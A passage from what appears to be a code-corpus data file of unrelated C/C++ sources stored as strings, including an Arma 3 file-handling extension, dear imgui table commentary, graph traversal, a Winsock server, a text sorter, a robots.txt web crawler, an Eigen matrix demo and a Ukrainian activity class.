padding\r\n\tfs::path filePath;\r\n\tstd::vector<String> arguments;\r\n\tif (argsCnt > 0) {\r\n\t\tfor (int i = 0; i < argsCnt; ++i) {\r\n\t\t\tString s{ args[i] };\r\n\t\t\ts.erase(0, 1);\r\n\t\t\ts.erase(s.size() - 1); //unescaped quotes are present when converting\r\n\t\t\targuments.push_back(s);\r\n\t\t}\r\n\t\ttry {\r\n\t\t\tfilePath = arguments.at(0);\r\n\t\t\tif (!fs::exists(filePath)) throw std::runtime_error(filePath.string() + \" not found\");\r\n;\t\t}\r\n\t\tcatch (const std::exception& e) {\r\n\t\t\tstrncpy_safe(output, e.what());\r\n\t\t\treturn ERROR;\r\n\t\t}\r\n\t}\r\n\r\n\t/*DATA FUNCTIONS*/\r\n\tif (areEqual(function, \"callbackData\")) {\r\n\t\tif (arguments.size() != 1) {\r\n\t\t\tstrncpy_safe(output, \"length_error: passed arguments should be two: [filePath].\");\r\n\t\t\treturn ERROR;\r\n\t\t}\r\n\t\ttry {\r\n\t\t\tauto whocares = std::async(std::launch::async, callbackPtr, \"btc_ArmaToJSON\", \"parseOutput\", arma::getOutput(filePath, outputSize).c_str());\r\n\t\t}\r\n\t\tcatch (const std::exception& e) {\r\n\t\t\tstrncpy_safe(output, e.what());\r\n\t\t\treturn ERROR;\r\n\t\t}\r\n\t\treturn OK;\r\n\t}\r\n\tif (areEqual(function, \"getData\")) {\r\n\t\tif (arguments.size() != 2) {\r\n\t\t\tstrncpy_safe(output, \"length_error: passed arguments should be two: [filePath, index].\");\r\n\t\t\treturn ERROR;\r\n\t\t}\r\n\t\ttry {\r\n\t\t\tint index = stoi(arguments.at(1));\r\n\t\t\tstrncpy_safe(output, arma::getData(filePath, outputSize, index));\r\n\t\t}\r\n\t\tcatch (const std::exception& e) {\r\n\t\t\tstrncpy_safe(output, e.what());\r\n\t\t\treturn ERROR;\r\n\t\t}\r\n\t\treturn OK;\r\n\t}\r\n\tif (areEqual(function, \"getPieces\")) {\r\n\t\tif (arguments.size() != 1) {\r\n\t\t\tstrncpy_safe(output, \"length_error: passed arguments should be one: [filePath].\");\r\n\t\t\treturn ERROR;\r\n\t\t}\r\n\t\ttry {\r\n\t\t\tstrncpy_safe(output, arma::getPieces(filePath, outputSize));\r\n\t\t}\r\n\t\tcatch (const std::exception& e) {\r\n\t\t\tstrncpy_safe(output, e.what());\r\n\t\t\treturn ERROR;\r\n\t\t}\r\n\t\treturn OK;\r\n\t}\r\n\t/*FILESYSTEM FUNCTIONS*/\r\n\tif (areEqual(function, \"dataExists\"))\r\n\t\tif (fs::exists(filePath)) return OK;\r\n\r\n\tif (areEqual(function, \"copyFile\")) {\r\n\t\tstrncpy_safe(output, arma::copyFile(filePath));\r\n\t\treturn OK;\r\n\t}\r\n\tif (areEqual(function, \"deleteFile\")) {\r\n\t\tstrncpy_safe(output, arma::deleteFile(filePath));\r\n\t\treturn OK;\r\n\t}\r\n\tif (areEqual(function, \"renameFile\")) {\r\n\t\tif (arguments.size() != 2) {\r\n\t\t\tstrncpy_safe(output, \"length_error: passed arguments should be two: [filePath, name].\");\r\n\t\t\treturn ERROR;\r\n\t\t}\r\n\t\ttry {\r\n\t\t\tString name{ arguments.at(1) };\r\n\t\t\tstrncpy_safe(output, arma::renameFile(filePath, name));\r\n\t\t}\r\n\t\tcatch (const std::exception& e) {\r\n\t\t\tstrncpy_safe(output, e.what());\r\n\t\t\treturn ERROR;\r\n\t\t}\r\n\t\treturn OK;\r\n\t}\r\n\tif (areEqual(function, \"retrieveList\")) {\r\n\t\tstrncpy_safe(output, arma::retrieveList());\r\n\t\treturn OK;\r\n\t}\r\n\t/*---------------------*/\r\n\tstrncpy_safe(output, \"Available Functions: getData, retrieveList, deleteFile, copyFile, renameFile\");\r\n\treturn ERROR;\r\n}\r\n\r\n//\"btc_ArmaToJSON\" callExtension \"btc_hm_Altis {}\"\r\n//\"btc_ArmaToJSON\" callExtension [\"dataExists\", [\"D:\\SteamLibrary\\steamapps\\common\\Arma 3\\btc_hm_Altis (20-20 2023-11-18).JSON\"]]\r\n//\"btc_ArmaToJSON\" callExtension [\"getData\", [\"D:\\SteamLibrary\\steamapps\\common\\Arma 3\\btc_hm_Altis (14-43 2024-01-04).JSON\", \"cities\", \"-1\"]]\r\n//\"btc_ArmaToJSON\" callExtension [\"getData\", [\"D:\\SteamLibrary\\steamapps\\common\\Arma 3\\btc_hm_Altis (14-43 2024-01-04).JSON\", \"Altis\", \"-1\"]]\r\n//\"btc_ArmaToJSON\" callExtension [\"retrieveList\", []]\r\n//\"btc_ArmaToJSON\" callExtension [\"deleteFile\", [\"D:\\SteamLibrary\\steamapps\\common\\Arma 3\\btc_hm_Altis (20-20 2023-11-18).JSON\"]]\r\n//\"btc_ArmaToJSON\" callExtension [\"copyFile\", [\"D:\\SteamLibrary\\steamapps\\common\\Arma 3\\btc_hm_Altis (20-20 2023-11-18).JSON\"]]\r\n//\"btc_ArmaToJSON\" callExtension [\"renameFile\", [\"D:\\SteamLibrary\\steamapps\\common\\Arma 3\\btc_hm_Altis (20-20 2023-11-18).JSON\", \"Test\"]]",
    "// dear imgui, v1.85 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.NavigateTo\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableDrawContextMenu()                  - draw right-click context menu\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//   - outer_size.x  > 0.0f  ->  Set Fixed width.",
    "#include <iostream>\n#include <vector>\n#include <queue>\n#include <stack>\nclass Graph\n{\n    private:\n    int n;\n    std::vector<int>* adjList;\n\n    public:\n    Graph(int node) : n(node)\n    {\n        adjList = new std::vector<int> [node+1];\n    }\n\n    ~Graph()\n    {\n        delete [] adjList;\n    }\n    \n    void addEdge(int u, int v)\n    {\n        adjList[u].push_back(v);\n        adjList[v].push_back(u);\n    }\n    \n    void Display()\n    {\n        for(int i = 0;i < n+1; i++)\n        {\n            std::cout<<\"adjList [\"<<i<<\"] { \";\n            for(const auto &i : adjList[i])\n            {\n                std::cout<<i<<\" \";\n            }\n            std::cout<<\"}\"<<std::endl;\n        }\n    }\n\n\n    std::vector<int> bfsOfGraph(int start)\n    {\n        std::queue<int> que;\n        que.push(start);\n        std::vector<int> bfsSol;\n        std::vector<bool> vist(n+1,false);\n        vist[start] = true;\n        while(!que.empty())\n        {\n            int node = que.front();\n            que.pop();\n            vist[node] = true;\n            bfsSol.push_back(node);\n            for (auto it : adjList[node])\n            {\n                if(!vist[it])\n                {\n                    que.push(it);\n                    vist[it] = true;\n                }\n            }\n        }\n        \n        return bfsSol;\n    }\n\n    std::vector<int> dfsOfGraph(int start)\n    {\n        std::stack<int> stc;\n        stc.push(start);\n        std::vector<int> dfsSol;\n        std::vector<bool> vist(n+1,false);\n        vist[start] = true;\n        while(!stc.empty())\n        {\n            int node = stc.top();\n            stc.pop();\n            vist[node] = true;\n            dfsSol.push_back(node);\n            for (auto it : adjList[node])\n            {\n                if(!vist[it])\n                {\n                    stc.push(it);\n                    vist[it] = true;\n                }\n            }\n        }\n        \n        return dfsSol;\n    }\n    \n\n};\n\nvoid printAns(std::vector <int> &ans) {\n    for (int i = 0; i < ans.size(); i++) {\n        std::cout << ans[i] << \" \";\n    }\n    std::cout<<std::endl;\n}\n\nint main()\n{\n    Graph g(5);\n    g.addEdge(1, 2);\n    g.addEdge(1, 5);\n    g.addEdge(2, 3);\n    g.addEdge(2, 5);\n    g.addEdge(3, 5);\n    g.addEdge(3, 4);\n    g.addEdge(4, 5);\n\n    std::vector<int> bfsResult = g.bfsOfGraph(1);\n    printAns(bfsResult);\n    std::vector<int> dfsResult = g.dfsOfGraph(1);\n    printAns(dfsResult);\n\n    g.Display();\n    return 0;\n}\n\n/*\n    Visualization:\n\n        1\n       /  \\\n      2 -- 5\n      |  / |\n      3 -- 4\n\n1 2 5 3 4 \nadjList [0] { }\nadjList [1] { 2 5 }\nadjList [2] { 1 3 5 }\nadjList [3] { 2 5 4 }\nadjList [4] { 3 5 }\nadjList [5] { 1 2 3 4 }\n\n*/\n\n\n\n",
    "//socket\n#include \"socket_server.hpp\"\n\nusing namespace std;\n\nunsigned int Socket::startupServer(){\n    //criando o windows meias\n    //so repliquei a documenta\u00e7\u00e3o fds\n    WSADATA wsd;\n\n    int started = WSAStartup(MAKEWORD(2, 2), &wsd);\n    if(started != 0){\n        cout << \"O Winsock deu pau =C\" << endl;\n        return 1;\n    }\n    //criando o socket pra conectar agr\n    Socket::server = socket(AF_INET, SOCK_STREAM, 0);\n    if(Socket::server == INVALID_SOCKET){\n        cout << \"N deu pra criar socket\" << endl;\n        WSACleanup();\n        return 1;\n    }\n    sockaddr_in serveraddress;\n    serveraddress.sin_family = AF_INET;\n    serveraddress.sin_addr.s_addr = INADDR_ANY;\n    serveraddress.sin_port = htons(8080);\n\n    if (bind(Socket::server, (sockaddr*)&serveraddress, sizeof(serveraddress)) == SOCKET_ERROR) {\n        cout << WSAGetLastError() << endl;\n        closesocket(server);\n        WSACleanup();\n        return 1;\n    }\n    if (listen(Socket::server, SOMAXCONN) == SOCKET_ERROR) {\n        //cout << \"teste\";\n        closesocket(server);\n        WSACleanup();\n        return 1;\n    }\n\n    cout << \"Socket criado na porta localhost::8080\" << endl;\n\n}\n\nunsigned int Socket::acceptConnection() {\n    sockaddr_in clientaddress;\n    int clientsize = sizeof(clientaddress);\n\n    Socket::client = accept(Socket::server, (sockaddr*)&clientaddress, &clientsize);\n    if (Socket::client == INVALID_SOCKET) {\n        cout << \"erro ao aceitar\" << endl;\n        closesocket(Socket::server);\n        WSACleanup();\n        return 1;\n    }\n\n    string handshake_response = \n        \"HTTP/1.1 101 Switching Protocols\\r\\n\"\n        \"Upgrade: websocket\\r\\n\"\n        \"Connection: Upgrade\\r\\n\"\n        \"Sec-WebSocket-Accept: dummy-key\\r\\n\\r\\n\"; \n\n    send(Socket::client, handshake_response.c_str(), handshake_response.length(), 0);\n\n    return 0;\n}\n\nunsigned int Socket::sendMessage(string message) {\n    // Enviar uma mensagem de teste para o cliente\n    string sentMessage = message;\n    send(Socket::client, sentMessage.c_str(), sentMessage.length(), 0);\n\n    return 0;\n}\n\nunsigned int Socket::receiveMessage(){\n\n    char buffer[1024];\n    int bytesReceived = recv(Socket::client, buffer, sizeof(buffer), 0);\n    if (bytesReceived > 0) {\n        cout << \"Mensagem do html: \" << string(buffer, bytesReceived) << endl;\n    }\n\n    return 0;\n}\n\nunsigned int Socket::stopServer(){\n closesocket(Socket::client);\n closesocket(Socket::server);\n WSACleanup();\n}",
    "#include <assert.h>\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n#include \"onegin_flagging.h\"\n#include \"text_t.h\"\n#include \"comparators.h\"\n#include \"sorting.h\"\n\n\nint read_sort_write (StartConfig* run_config);\nint sort_write(text_t* text, StartConfig* run_config, FILE* output_file);\n\nint main(int argc, char *argv[])\n{\n    time_t start = clock();\n\n    StartConfig run_config = {.encoding = UTF8};\n\n    if (!onegin_setup(argc, argv, &run_config))\n        return -1;\n\n    int ret_value = read_sort_write(&run_config);\n\n    time_t end = clock();\n    printf(\"TIME = %ld\\n\", end - start);\n\n    return ret_value;\n}\n\nint read_sort_write (StartConfig* run_config)\n{\n    FILE* input_file = fopen(run_config->input_file, \"r\");\n    if (input_file == NULL)\n    {\n        printf(\"Could not open file \\\"%s\\\"\", run_config->input_file);\n        return -1;\n    }\n\n    text_t text = {};\n    if (!text_ctor(&text, input_file))\n        return -1;\n\n    fclose(input_file);\n\n    FILE* output_file = fopen(run_config->output_file, \"w\");\n\n    if (output_file == NULL)\n    {\n        printf(\"Could not open file \\\"%s\\\"\", run_config->output_file);\n        return -1;\n    }\n\n    sort_write(&text, run_config, output_file);\n\n    fclose(output_file);\n    text_dtor(&text);\n\n    return 0;\n}\n\nint sort_write(text_t* text, StartConfig* run_config, FILE* output_file)\n{\n    for (size_t i = 0; i < run_config->sorts_n; i++)\n    {\n        bool is_sorted = text->state == run_config->sorts[i];\n\n        switch (run_config->sorts[i])\n        {\n            case BEG_ASC:\n            {\n                fprintf(output_file, \"Sorting: beg_ascend\\n\");\n                if (!is_sorted)\n                    text_sort(text, comp_beg_ascend);\n                print_text_lines(text, output_file);\n                break;\n            }\n            case END_ASC:\n            {\n                fprintf(output_file, \"Sorting: end_ascend\\n\");\n                if (!is_sorted)\n                    text_sort(text, comp_end_ascend);\n                print_text_lines(text, output_file);\n                break;\n            }\n            case UNSORTED:\n            {\n                fprintf(output_file, \"Sorting: unsorted\\n\");\n                print_buff(text, output_file);\n                break;\n            }\n            default:\n            {\n                assert(0 && \"invalid flagging\");\n            }\n        }\n        text->state = run_config->sorts[i];\n    }\n\n    return 0;\n}\n",
    "#include \"../header/WebCrawler.h\"\n\n#define INITIAL_BUF_SIZE 64*1024\n#define THRESHOLD 32*1024\n\n#define ROBOTS_MAX 16384\n\nWebCrawler::WebCrawler() {}\n\nWebCrawler::~WebCrawler() {\n    delete[] this->_threads;\n    delete[] this->_fileBuf;\n}\n\nvoid WebCrawler::LoadQueue(FILE* file) {\n\n    printf(\"Opening file...\\n\");\n    if (file == NULL) {\n        perror(\"Failed to open file\\n\");\n        return;\n    }\n\n    // get file size\n    fseek(file, 0L, SEEK_END);\n    long sz = ftell(file);\n    fseek(file, 0L, SEEK_SET);\n\n    // initialize buffer; make room for null terminating character\n    this->_fileBuf = (char *)malloc(sz + 1);\n    fread(this->_fileBuf, sz, 1, file);\n    _fileBuf[sz] = '\\0';\n\n    // populate queue\n    char* start = this->_fileBuf;\n\tchar* lineEnd = strchr(this->_fileBuf, '\\n');\n\n\twhile (lineEnd != NULL) {\n\n        // push URL\n\t\tthis->_q.push(start);\n\n        // find next URL\n\t\tstart = lineEnd + 1;\n\t\tif (*(lineEnd - 1) == '\\r') {\n\t\t\tlineEnd--;\n\t\t}\n\t\t*(lineEnd) = '\\0';\n\t\tlineEnd = strchr(start, '\\n');\n\t}\n    this->_q.push(start); // get last URL at EOF\n\n    printf(\"Loaded %zu URLs into queue\\n\", this->_q.size());\n}\n\nvoid WebCrawler::Crawl(int numThreads) {\n\n    // initialize threads\n    this->_threads = new pthread_t[numThreads];\n    for (int i = 0; i < numThreads; ++i) {\n        if (pthread_create(this->_threads + i, NULL, &WebCrawler::ThreadStartRoutine, this) != 0) {\n            perror(\"Failed to create thread\\n\");\n            return;\n        }\n    }\n\n    // join threads\n    for (int i = 0; i < numThreads; ++i) {\n        if (pthread_join(this->_threads[i], NULL) != 0) {\n            perror(\"Failed to join thread\\n\");\n            return;\n        }\n    }\n}\n\nvoid WebCrawler::Run() {\n    while (true) {\n        this->_mutex.lock();\n        if (this->_q.empty()) {\n            this->_mutex.unlock();\n            break;\n        }\n\n        char* curr = this->_q.front();\n        this->_q.pop();\n        this->_mutex.unlock();\n\n        WebClientUrl webClientUrl(curr);\n        ProcessUrl(webClientUrl);\n    }\n}\n\nvoid WebCrawler::ProcessUrl(WebClientUrl &webClientUrl) {\n    struct addrinfo hints;\n    struct addrinfo *result;\n    char *ipstr = new char[IPV4_BUF_SIZE];\n    WebCrawler::DoForwardLookup(webClientUrl, hints, result, ipstr);\n    WebCrawler::DoConnect(webClientUrl, result, ipstr);\n\n    delete[] ipstr;\n    freeaddrinfo(result);\n}\n\nint WebCrawler::DoDNSLookup(WebClientUrl &webClientUrl) {\n    // TODO\n}\n\nint WebCrawler::DoForwardLookup(WebClientUrl &webClientUrl, struct addrinfo &hints, struct addrinfo* &result, char *ipstr) {\n    memset(&hints, 0, sizeof(hints));\n    hints.ai_family = AF_INET;    /* Allow only IPv4 */\n    hints.ai_socktype = SOCK_STREAM; /* Stream socket */\n    hints.ai_flags = AI_CANONNAME;\n    hints.ai_protocol = 0;          /* Any protocol */\n\n    int s = getaddrinfo(webClientUrl.getHost(), NULL, &hints, &result);\n    if (s != 0) {\n        fprintf(stderr, \"getaddrinfo: %s\\n\", gai_strerror(s));\n        return -1;\n    }\n\n    if (result) {\n        void *addr = &((struct sockaddr_in *)result->ai_addr)->sin_addr;\n        inet_ntop(result->ai_family, addr, ipstr, IPV4_BUF_SIZE);\n        printf(\"First available IP Address for %s: %s\\n\", webClientUrl.getHost(), ipstr);\n    } else {\n        printf(\"No addresses found for %s\\n\", webClientUrl.getHost());\n    }\n    return 0;\n}\n\n\nint WebCrawler::DoReverseLookup(WebClientUrl &webClientUrl) {\n\n}\n\nint WebCrawler::DoConnect(WebClientUrl &webClientUrl, struct addrinfo* &result, char *ipstr) {\n    struct sockaddr_in serv_addr;\n    int clientfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // Est TCP Connection\n    if (clientfd < 0) {\n        perror(\"Socket creation error\\n\");\n        return -1;\n    }\n\n    serv_addr.sin_family = AF_INET; // IPv4\n    serv_addr.sin_port = htons(static_cast<unsigned short>(std::stoi(webClientUrl.getPort())));\n\n    printf(\"In connect with IP addr: %s\\n\", ipstr);\n\n    if (inet_pton(AF_INET, ipstr, &serv_addr.sin_addr) <= 0) {\n        perror(\"Invalid address / address not supported\\n\");\n        return -1;\n    }\n\n    printf(\"Checkpoint 1\\n\");\n\n    int status;\n    if ((status = connect(clientfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))) < 0) {\n        perror(\"Failed connection\");\n        fprintf(stderr, \"Error code: %d\\n\", errno);\n        close(clientfd);\n        return -1;\n    }\n\n    printf(\"Checkpoint 2\\n\");\n\n    char sendBuf[BUFSIZ];\n    snprintf(sendBuf, BUFSIZ,\n             \"HEAD /robots.txt HTTP/1.1\\r\\n\"\n             \"Host: %s\\r\\n\"\n             \"User-agent: yukiTAMUCrawler/1.0\\r\\n\"\n             \"Connection: close\\r\\n\\r\\n\",\n             webClientUrl.getHost());\n\n\tsend(clientfd, sendBuf, strlen(sendBuf), 0);\n\n    printf(\"Sent %s\\n\", sendBuf);\n\n\t// receive response\n\tint ret, currPos = 0, bufSize = INITIAL_BUF_SIZE;\n\tchar* recvBuf = (char*)malloc(INITIAL_BUF_SIZE);\n\n\twhile (true) {\n        int bytes = recv(clientfd, recvBuf + currPos, bufSize - currPos, 0);\n        if (bytes == 0) { // nothing left to read\n            break;\n ",
    "#include \"Declarations.h\"\r\n\r\n#include <Eigen/Dense>\r\n\r\n#include <iostream>\r\n\r\nusing std::cout;\r\n\r\nvoid standard_operators()\t\t// Top calling function\r\n{\r\n\tcout << \"***** standard_operators() Top calling function *****\\n\";\r\n\tmatrix_product();\r\n\tscalar_multiplication();\r\n\taddition_subtraction();\r\n\tcompute_expression();\r\n\r\n}\r\n\r\nvoid matrix_product()\r\n{\r\n\tcout << \"*** matrix_product() ***\\n\";\r\n\tusing Eigen::MatrixXd;\r\n\r\n\tMatrixXd A\r\n\t{\r\n\t\t{1.0, 2.0, 3.0},\r\n\t\t{1.5, 2.5, 3.5},\r\n\t\t{4.0, 5.0, 6.0},\r\n\t\t{4.5, 5.5, 6.5},\r\n\t\t{7.0, 8.0, 9.0}\r\n\t};\r\n\r\n\tMatrixXd B\r\n\t{\r\n\t\t{1.0, 2.0, 3.0, 4.0, 5.0},\r\n\t\t{1.5, 2.5, 3.5, 4.5, 5.5},\r\n\t\t{5.0, 6.0, 7.0, 8.0, 8.5}\r\n\t};\r\n\r\n\tMatrixXd prod_ab = A * B;\t\t// Eigen::Product<Matrix<double,...>, Matrix<double,...>> type\r\n\tcout << \"A (5 x 3) * B (3 x 5) = \\n\\n\" << prod_ab << \"\\n\";\r\n\r\n\tcout << \"\\n\\n\";\r\n}\r\n\r\nvoid scalar_multiplication()\r\n{\r\n\tcout << \"*** scalar_multiplication() ***\\n\";\r\n\tusing Eigen::MatrixXd;\r\n\r\n\tMatrixXd A\r\n\t{\r\n\t\t{1.0, 2.0, 3.0},\r\n\t\t{1.5, 2.5, 3.5},\r\n\t\t{4.0, 5.0, 6.0},\r\n\t\t{4.5, 5.5, 6.5},\r\n\t\t{7.0, 8.0, 9.0}\r\n\t};\r\n\r\n\tMatrixXd scale_a = 0.5 * A;\r\n\tcout << \"Scalar multiplication: 0.5 * A:\\n\";\r\n\tcout << scale_a << \"\\n\\n\";\r\n\r\n\tMatrixXd B\r\n\t{\r\n\t\t{1.0, 2.0, 3.0, 4.0, 5.0},\r\n\t\t{1.5, 2.5, 3.5, 4.5, 5.5},\r\n\t\t{5.0, 6.0, 7.0, 8.0, 8.5}\r\n\t};\r\n\r\n\tB *= 2.0;\r\n\tcout << \"Scaled B matrix: 2.0 * B:\\n\";\r\n\tcout << B << \"\\n\\n\";\r\n\r\n\tcout << \"\\n\\n\";\r\n\r\n}\r\n\r\nvoid addition_subtraction()\r\n{\r\n\tusing Eigen::MatrixXd;\r\n\tcout << \"*** addition_subtraction() ***\\n\";\r\n\r\n\tMatrixXd A\r\n\t{\r\n\t\t{1.0, 2.0, 3.0},\r\n\t\t{1.5, 2.5, 3.5},\r\n\t\t{4.0, 5.0, 6.0},\r\n\t\t{4.5, 5.5, 6.5},\r\n\t\t{7.0, 8.0, 9.0}\r\n\t};\r\n\r\n\tMatrixXd C\r\n\t{\r\n\t\t{10.0, 20.0, 30.0},\r\n\t\t{10.5, 20.5, 30.5},\r\n\t\t{40.0, 50.0, 60.0},\r\n\t\t{40.5, 50.5, 60.5},\r\n\t\t{70.0, 80.0, 90.0}\r\n\t};\r\n\r\n\tMatrixXd mtx_sum = A + C;\r\n\tcout << \"Sum of matrices A + C =:\\n\";\r\n\tcout << mtx_sum << \"\\n\\n\";\r\n\r\n\tMatrixXd mtx_diff = C - A;\r\n\tcout << \"Difference of matrices C - A =:\\n\";\r\n\tcout << mtx_diff << \"\\n\\n\";\r\n\r\n}\r\n\r\nvoid compute_expression()\r\n{\r\n\tusing Eigen::MatrixXd, Eigen::VectorXd;\r\n\tcout << \"*** compute_expression() ***\\n\";\r\n\r\n\tMatrixXd A\r\n\t{\r\n\t\t{10.0, 20.0},\r\n\t\t{30.0, 40.0}\r\n\t};\r\n\r\n\tMatrixXd B\r\n\t{\r\n\t\t{0.1, 0.2},\r\n\t\t{0.3, 0.4}\r\n\t};\r\n\r\n\tMatrixXd C\r\n\t{\r\n\t\t{8.74, 58.63},\r\n\t\t{10.6, 4.19}\r\n\t};\r\n\r\n\tVectorXd u{{5.315, 7.207}};\r\n\tVectorXd v{{0.3, 0.11}};\r\n\r\n\tVectorXd w = A * u + B * v;\r\n\tMatrixXd M = A * B + u.dot(v) * C;\t\t// u.dot(v): dot product uv\r\n\r\n\t// Will not compile, since u and are both column vectors:\r\n\t//double dot_prod = u * v;\r\n\r\n\tcout << \"Resultant Vector:\\n\" << w << \"\\n\\n\";\r\n\tcout << \"Resultant Matrix:\\n\" << M << \"\\n\\n\";\r\n}\r\n\r\n",
    "#include <iostream>\n#include <deque>\n#include <string>\n#include <fstream>    // \u0434\u043b\u044f \u0440\u043e\u0431\u043e\u0442\u0438 \u0437 \u0444\u0430\u0439\u043b\u0430\u043c\u0438\n#include <sstream>    // \u0434\u043b\u044f \u0440\u043e\u0431\u043e\u0442\u0438 \u0437 \u0440\u044f\u0434\u043a\u0430\u043c\u0438\n#include <locale>     // \u0434\u043b\u044f \u0432\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u043d\u044f \u043b\u043e\u043a\u0430\u043b\u0456\n#include <codecvt>    // \u0434\u043b\u044f \u0440\u043e\u0431\u043e\u0442\u0438 \u0437 \u043a\u043e\u0434\u0443\u0432\u0430\u043d\u043d\u044f\u043c\n#include <windows.h>  // \u0434\u043b\u044f \u0444\u0443\u043d\u043a\u0446\u0456\u0439 SetConsoleCP \u0442\u0430 SetConsoleOutputCP\n\n// \u041a\u043b\u0430\u0441 \u0434\u043b\u044f \u0437\u0431\u0435\u0440\u0456\u0433\u0430\u043d\u043d\u044f \u0456\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u0457 \u043f\u0440\u043e \u0430\u043a\u0442\u0438\u0432\u043d\u0456\u0441\u0442\u044c\nclass Activity {\npublic:\n    // \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u043a\u043b\u0430\u0441\u0443, \u044f\u043a\u0438\u0439 \u0456\u043d\u0456\u0446\u0456\u0430\u043b\u0456\u0437\u0443\u0454 \u043d\u0430\u0437\u0432\u0443 \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0456 \u0442\u0430 \u0442\u0440\u0438\u0432\u0430\u043b\u0456\u0441\u0442\u044c\n    Activity(const std::wstring& name = L\"\", int duration = 0)\n        : name(name), duration(duration) {}\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u043e\u0442\u0440\u0438\u043c\u0430\u043d\u043d\u044f \u043d\u0430\u0437\u0432\u0438 \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0456\n    std::wstring getName() const { return name; }\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u043e\u0442\u0440\u0438\u043c\u0430\u043d\u043d\u044f \u0442\u0440\u0438\u0432\u0430\u043b\u043e\u0441\u0442\u0456 \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0456\n    int getDuration() const { return duration; }\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0442\u0432\u043e\u0440\u0435\u043d\u043d\u044f \u0456\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0456\u0457 \u043f\u0440\u043e \u0430\u043a\u0442\u0438\u0432\u043d\u0456\u0441\u0442\u044c \u0443 \u0440\u044f\u0434\u043e\u043a (\u0434\u043b\u044f \u0437\u0430\u043f\u0438\u0441\u0443 \u0443 \u0444\u0430\u0439\u043b)\n    std::wstring toString() const {\n        std::wostringstream oss;\n        oss << name << L\",\" << duration;\n        return oss.str();\n    }\n\n    // \u041c\u0435\u0442\u043e\u0434 \u0434\u043b\u044f \u0441\u0442\u0432\u043e\u0440\u0435\u043d\u043d\u044f \u043e\u0431'\u0454\u043a\u0442\u0430 \u0430\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0456 \u0437 \u0440\u044f\u0434\u043a\u0430 (\u043f\u0456\u0434 \u0447\u0430\u0441 \u0447\u0438\u0442\u0430\u043d\u043d\u044f \u0437 \u0444\u0430\u0439\u043b\u0443)\n    static Activity fromString(const std::wstring& str) {\n        std::wistringstream iss(str);\n        std::wstring name;\n        int duration;\n        // \u0427\u0438\u0442\u0430\u0454\u043c\u043e 